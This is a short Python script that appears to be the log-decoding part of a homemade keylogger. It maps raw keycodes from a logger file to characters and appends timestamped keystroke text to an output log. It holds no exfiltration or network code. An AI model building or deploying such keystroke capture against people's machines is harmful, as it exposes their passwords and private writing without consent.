import datetime
 
fin = open("/root/Documents/logger/keymaps.txt", "r")
lineList = fin.readlines()
fin.close()
args = ['nul']*88
 
for line in lineList:
	#print line
	if line[0] == "k":
          #print int(line[8:10])
          args.insert(int(line[8:10]),line[12:len(line)-1])
          args.pop()
#print args
#print len(args)
#now that i have formed the args list..I can work on the args array!
fin = open("/root/Documents/logger/logger.txt", "r")
lineList = fin.readlines()
fin.close()
f = open("/root/Documents/logger/output.log", "a")
 
index = 0
for line in lineList:
	    #print line
	    if line[0:5] == "keyco":
		if index == 0:
		     	f.write("\n \n"+datetime.datetime.now().strftime("%I:%M%p on %B %d, %Y")+" \n ============================================== \n")
			#Datetime to be saved only when some keycode is read
 
		########################### actual keystrokes get recorded here ######################
		index = int(line[9:11])
		if (index==42 or index==54) and line[12:len(line)-1]=="press":
			#shift has been pressed
		 	f.write("<Shift pressed>")
		elif index==58 and line[12:len(line)-1]=="press":
			#caps has been pressed			
			f.write("<Caps pressed>")
		elif index==28 and line[12:len(line)-1]=="release":
			f.write("\n")
		elif index==57 and line[12:len(line)-1]=="release":
			f.write("\t")
		elif (index==42 or index==54) and line[12:len(line)-1]=="release":
			#shift has been released
		 	f.write("<Shift released>")
		elif index==58 and line[12:len(line)-1]=="release":
			#caps has been released			
			f.write("<Caps released>")
		elif line[12:len(line)-1]=="release":
			f.write(args[index])
 
f.close()
#file writing is done
